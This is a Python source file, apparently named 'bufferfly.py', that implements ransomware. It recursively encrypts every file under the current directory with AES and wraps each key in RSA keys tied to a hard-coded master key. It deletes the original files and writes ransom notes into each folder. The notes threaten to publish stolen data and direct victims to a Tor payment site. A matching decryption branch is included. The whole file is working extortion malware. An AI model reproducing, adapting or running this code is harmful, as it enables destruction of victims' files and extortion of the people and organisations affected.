from Crypto.Cipher import AES
from Crypto.Util.number import *
import base64
import binascii
import os
import re


Main_RSA_n = 18461090511526494635680046089239911506582300448626881063830286038674865652783677024404293738678094212847547547457166471135492764422082854574133502325088817564614902648045539104101815287573218866088294414838961195968474193865414756152616434018063043282100025282389589552426871973306643932112713322426244034286383859635930292449783916320363306991656169643845016783071779181067359502011218907150938073150434398468282966556087934165438089239862856178140399744182514709857990974726101003114382533227994179033507725844701607500151684788922402605171926057790318786106279294985164731956599181078807132058577967175719374466651
Main_RSA_e = 65537

readme_filename = "bufferfly.readme"
len_readme_filename = len(readme_filename)
suffix = ".encrypted"
len_suffix = len(suffix)

all_dir = []
all_file = []
readme_data = """Hello

Your files are encrypted and can not be used
We have downloaded your confidential data and are ready to publish it on our blog
To return your files in work condition you need decryption tool
Follow the instructions to decrypt all your data

Do not try to change or restore files yourself, this will break them
If you want, on our site you can decrypt one file for free. Free test decryption allowed only for not valuable file with size less than 3MB

How to get decryption tool:
1) Download and install TOR browser by this link: https://www.torproject.org/download/
2) If TOR blocked in your country and you can't access to the link then use any VPN software
3) Run TOR browser and open the site: [DATA EXPUNGED]
4) Copy your private ID in the input field. Your Private key: [DATA EXPUNGED]
5) You will see payment information and we can make free test decryption here
6)After payment, you will receive a tool for decrypting files, and we will delete the data that was taken from you

Our blog of leaked companies:
[DATA EXPUNGED]

If you are unable to contact us through the site, then you can email us: [DATA EXPUNGED]
Waiting for a response via mail can be several days. Do not use it if you have not tried contacting through the site."""


def get_file_and_path(path):
	lsdir = os.listdir(path)
	dirs = [i for i in lsdir if os.path.isdir(os.path.join(path, i))]
	if dirs:
		for i in dirs:
			get_file_and_path(os.path.join(path, i))
	files = [i for i in lsdir if os.path.isfile(os.path.join(path,i))]
	for f in dirs:
		temp = (os.path.join(path, f))
		if os.path.isdir(temp):
			all_dir.append(temp)
	for f in files:
		temp = (os.path.join(path, f))
		if not os.path.isdir(temp):
			all_file.append(temp)


def encrypt(path):
	key = os.urandom(16)
	key_enc = base64.b64encode(long_to_bytes(pow(bytes_to_long(key), TMP_RSA_e, TMP_RSA_n)))
	file_head = b"%b:%b:%b:" % (TMP_PUBKEY, TMP_PRIKEY, key_enc)
	enc = AES.new(key, AES.MODE_CBC, key)
	file = open(path, "rb")
	file_data = file.read()
	length = len(file_data)
	if length % 16 != 0:
		padlen = 16 - (length % 16)
		file_data = file_data + chr(padlen).encode() * padlen
	file.close()
	cipher = enc.encrypt(file_data)
	file = open(path + suffix, "wb")
	file.write(file_head + cipher)
	file.close()
	os.remove(path)


def decrypt(path, key):
	file = open(path, "rb")
	byte_data = file.read()
	file.close()
	key_set = re.findall(".*?:.*?:.*?:", byte_data.decode("ISO-8859-1"))[0]
	cipher = byte_data[len(key_set):]
	key_set = key_set.split(":")
	TMP_PUBKEY = bytes_to_long(base64.b64decode(key_set[0]))
	TMP_PRIKEY = key
	test = getPrime(1024)
	if test == pow(pow(test, Main_RSA_e, TMP_PUBKEY), TMP_PRIKEY, TMP_PUBKEY):
		key_enc = key_set[2]
		key = long_to_bytes(pow(bytes_to_long(base64.b64decode(key_enc)), TMP_PRIKEY, TMP_PUBKEY))
		dec = AES.new(key, AES.MODE_CBC, key)
		file_data_paded = dec.decrypt(cipher)
		if file_data_paded[-1] < 16:
			if file_data_paded[-file_data_paded[-1]:] == chr(file_data_paded[-1]).encode() * int(file_data_paded[-1]):
				file_data = file_data_paded[:-file_data_paded[-1]]
			else:
				file_data = file_data_paded
		else:
			file_data = file_data_paded
		file = open(path[:-len_suffix], "wb")
		file.write(file_data)
		file.close()
	else:
		print("Key error for %s" % path)
		global clean_flag
		clean_flag = False


def readme(path):
	for _ in path:
		file = open(_ + "/" + readme_filename, "w")
		file.write(readme_data)
		file.close()


def clean(path):
	for _ in path:
		if _[-len_readme_filename:] == readme_filename or _[-len_suffix:] == suffix:
			os.remove(_)


if __name__ == "__main__":
	get_file_and_path(".")
	all_file.pop(all_file.index("./bufferfly.py"))
	if readme_filename not in os.listdir("."):
		TMP_RSA_p = getPrime(1024)
		TMP_RSA_q = getPrime(1024)
		TMP_RSA_n = TMP_RSA_p * TMP_RSA_q
		TMP_RSA_e = 65537
		TMP_RSA_phi = (TMP_RSA_p - 1) * (TMP_RSA_q - 1)
		TMP_RSA_d = inverse(TMP_RSA_e, TMP_RSA_phi)
		TMP_PUBKEY = base64.b64encode(long_to_bytes(TMP_RSA_n))
		TMP_PRIKEY = base64.b64encode(long_to_bytes(pow(TMP_RSA_d, Main_RSA_e, Main_RSA_n)))
		for _ in all_file:
			encrypt(_)
		readme(all_dir)
		file = open("./%s" % readme_filename, "w")
		file.write(readme_data)
		file.close()
	else:
		print(readme_data)
		key = str(input("Entry the key: "))
		clean_flag = True
		key = bytes_to_long(base64.b64decode(key))
		for _ in all_file:
			if _[-len_suffix:] == suffix:
				decrypt(_, key)
		if clean_flag:
			clean(all_file)